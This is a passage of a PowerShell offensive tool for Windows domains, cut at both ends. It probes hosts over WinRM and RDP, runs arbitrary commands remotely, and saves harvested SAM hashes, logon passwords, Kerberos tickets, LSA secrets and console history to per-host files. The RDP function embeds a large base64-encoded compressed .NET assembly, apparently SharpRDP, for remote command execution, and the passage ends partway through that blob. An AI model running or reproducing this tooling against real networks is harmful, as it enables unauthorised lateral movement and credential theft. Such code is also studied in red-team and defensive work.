                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "ERROR" -NameLength $NameLength -OSLength $OSLength
                continue
            } 
            elseif ($result -eq "Timed Out") {
                if ($successOnly) { continue }
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Yellow -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength
                continue
            } 
            elseif ($result -eq "Successful Connection PME") {
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
            } 
            
            elseif ($result -eq "Unable to connect") {}

            elseif ($result -match "[a-zA-Z0-9]") {
                
                if ($result -eq "No Results") {
                    if ($successOnly) { continue }
                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Yellow -statusSymbol "[*] " -statusText "NO RESULTS" -NameLength $NameLength -OSLength $OSLength
                } 
                else {
                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength

                    $filePath = switch ($Module) {
                        "SAM"            { "$SAM\$($runspace.ComputerName)-SAMHashes.txt" }
                        "LogonPasswords" { "$LogonPasswords\$($runspace.ComputerName)-LogonPasswords.txt" }
                        "Tickets"        { "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" }
                        "eKeys"          { "$eKeys\$($runspace.ComputerName)-eKeys.txt" }
                        "KerbDump"       { "$KerbDump\$($runspace.ComputerName)-Tickets-KerbDump.txt" }
                        "LSA"            { "$LSA\$($runspace.ComputerName)-LSA.txt" }
                        "ConsoleHistory" { "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" }
                        "Files"          { "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" }
                        default          { $null }
                    }

                    if ($filePath) {
                        $result | Out-File -FilePath $filePath -Encoding "ASCII"
                        
                        if ($ShowOutput) {
                            $result | Write-Host
                            Write-Host
                            $hasDisplayedResult = $true
                        }
                    }

                    # Handle the default case.
                    if (-not $Module -and -not $hasDisplayedResult) {
                        $result | Write-Host
                        Write-Host
                        $hasDisplayedResult = $true
                    }
                }
            } 
            elseif ($result -notmatch "[a-zA-Z0-9]") {
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
            }

             # Dispose of runspace and close handle
            $runspace.Runspace.Dispose()
            $runspace.Handle.AsyncWaitHandle.Close()
        }
    }

    Start-Sleep -Milliseconds 100
} while ($runspaces | Where-Object { -not $_.Completed })


# Clean up
$runspacePool.Close()
$runspacePool.Dispose()



}

################################################################################################################
############################################### Function: WinRM ################################################
################################################################################################################
Function Method-WinRM {
Write-host

# Create a runspace pool
$runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
$runspacePool.Open()
$runspaces = New-Object System.Collections.ArrayList

$scriptBlock = {
    param ($computerName, $Command)
    
$tcpClient = New-Object System.Net.Sockets.TcpClient
$asyncResult = $tcpClient.BeginConnect($ComputerName, 5985, $null, $null)
$wait = $asyncResult.AsyncWaitHandle.WaitOne(50) 

if ($wait) { 
    try {
        $tcpClient.EndConnect($asyncResult)
        $connected = $true
    } catch {
        $connected = $false
    }
} else {
    $connected = $false
}

$tcpClient.Close()
if (!$connected) {return "Unable to connect" }
      
        try {
        
        if ($Command -eq ""){
            return Invoke-Command -ComputerName $computerName -ScriptBlock  {echo "Successful Connection PME"}  -ErrorAction Stop
        }   
            return Invoke-Command -ComputerName $computerName -ScriptBlock {Invoke-Expression $Using:Command} -ErrorAction Stop
        } catch {
            if ($_.Exception.Message -like "*Access is Denied*") {
                return "Access Denied"
            } if ($_.Exception.Message -like "*cannot be resolved*") {
                return "Unable to connect"
        }
    }
}



function Display-ComputerStatus {
    param (
        [string]$ComputerName,
        [string]$OS,
        [System.ConsoleColor]$statusColor = 'White',
        [string]$statusSymbol = "",
        [string]$statusText = "",
        [int]$NameLength,
        [int]$OSLength
    )

    # Prefix
    Write-Host "WinRM " -ForegroundColor Yellow -NoNewline
    Write-Host "   " -NoNewline

          # Attempt to resolve the IP address
        $IP = $null
        $Ping = New-Object System.Net.NetworkInformation.Ping 
        $Result = $Ping.Send($ComputerName, 10)

        if ($Result.Status -eq 'Success') {
            $IP = $Result.Address.IPAddressToString
            Write-Host ("{0,-16}" -f $IP) -NoNewline
        }
    
        else {Write-Host ("{0,-16}" -f $IP) -NoNewline}
    
    # Display ComputerName and OS
    Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
    Write-Host "   " -NoNewline
    Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
    Write-Host "   " -NoNewline

    # Display status symbol and text
    Write-Host $statusSymbol -ForegroundColor $statusColor -NoNewline
    Write-Host $statusText
}


# Create and invoke runspaces for each computer
foreach ($computer in $computers) {

    $ComputerName = $computer.Properties["dnshostname"][0]
    $OS = $computer.Properties["operatingSystem"][0]
    
    $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command)
    $runspace.RunspacePool = $runspacePool

    [void]$runspaces.Add([PSCustomObject]@{
        Runspace = $runspace
        Handle = $runspace.BeginInvoke()
        ComputerName = $ComputerName
        OS = $OS
        Completed = $false
        })
}

# Poll the runspaces and display results as they complete


do {
    foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
        
        if ($runspace.Handle.IsCompleted) {
            $runspace.Completed = $true
            $result = $runspace.Runspace.EndInvoke($runspace.Handle)
            $hasDisplayedResult = $false

            # [other conditions for $result]
            if ($result -eq "Access Denied") {
                if ($successOnly) { continue }
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength
                continue
            } 
            elseif ($result -eq "Unspecified Error") {
                if ($successOnly) { continue }
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ERROR" -NameLength $NameLength -OSLength $OSLength
                continue
            } 
            elseif ($result -eq "Timed Out") {
                if ($successOnly) { continue }
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Yellow -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength
                continue
            } 
            elseif ($result -eq "Successful Connection PME") {
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
            } 
            
            elseif ($result -eq "Unable to connect") {}

            elseif ($result -match "[a-zA-Z0-9]") {
                
                if ($result -eq "No Results") {
                    if ($successOnly) { continue }
                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Yellow -statusSymbol "[*] " -statusText "NO RESULTS" -NameLength $NameLength -OSLength $OSLength
                } 
                else {
                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength

                    $filePath = switch ($Module) {
                        "SAM"            { "$SAM\$($runspace.ComputerName)-SAMHashes.txt" }
                        "LogonPasswords" { "$LogonPasswords\$($runspace.ComputerName)-LogonPasswords.txt" }
                        "Tickets"        { "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" }
                        "eKeys"          { "$eKeys\$($runspace.ComputerName)-eKeys.txt" }
                        "KerbDump"       { "$KerbDump\$($runspace.ComputerName)-Tickets-KerbDump.txt" }
                        "LSA"            { "$LSA\$($runspace.ComputerName)-LSA.txt" }
                        "ConsoleHistory" { "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" }
                        "Files"          { "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" }
                        default          { $null }
                    }

                    if ($filePath) {
                        $result | Out-File -FilePath $filePath -Encoding "ASCII"
                        
                        if ($ShowOutput) {
                            $result | Write-Host
                            Write-Host
                            $hasDisplayedResult = $true
                        }
                    }

                    # Handle the default case.
                    if (-not $Module -and -not $hasDisplayedResult) {
                        $result | Write-Host
                        Write-Host
                        $hasDisplayedResult = $true
                    }
                }
            } 
            elseif ($result -notmatch "[a-zA-Z0-9]") {
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
            }

             # Dispose of runspace and close handle
            $runspace.Runspace.Dispose()
            $runspace.Handle.AsyncWaitHandle.Close()
        }
    }

    Start-Sleep -Milliseconds 100
} while ($runspaces | Where-Object { -not $_.Completed })





# Clean up
$runspacePool.Close()
$runspacePool.Dispose()

}


################################################################################################################
################################################# Function: RDP ################################################
################################################################################################################
Function Method-RDP {
$ErrorActionPreference = "SilentlyContinue"
Write-Host

    $MaxConcurrentJobs = $Threads
    $RDPJobs = @()

foreach ($Computer in $Computers) {
$OS = $computer.Properties["operatingSystem"][0]
$ComputerName = $computer.Properties["dnshostname"][0]
$Random = Get-Random -Maximum "10" -Minimum "1"
Start-sleep -Seconds $Random
$ScriptBlock = {
            Param($OS, $ComputerName, $Domain, $Username, $Password, $NameLength, $OSLength, $LocalAuth)
            $tcpClient = New-Object System.Net.Sockets.TcpClient -ErrorAction SilentlyContinue
	        $asyncResult = $tcpClient.BeginConnect($ComputerName, 3389, $null, $null)
	        $wait = $asyncResult.AsyncWaitHandle.WaitOne(50)
	        IF ($wait){ 
		        try{$tcpClient.EndConnect($asyncResult)
		        $tcpClient.Close()}Catch{}

function Invoke-SharpRDP{
    [CmdletBinding()]
    Param (
        [String]
        $Command = " "

    )
    $a=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String("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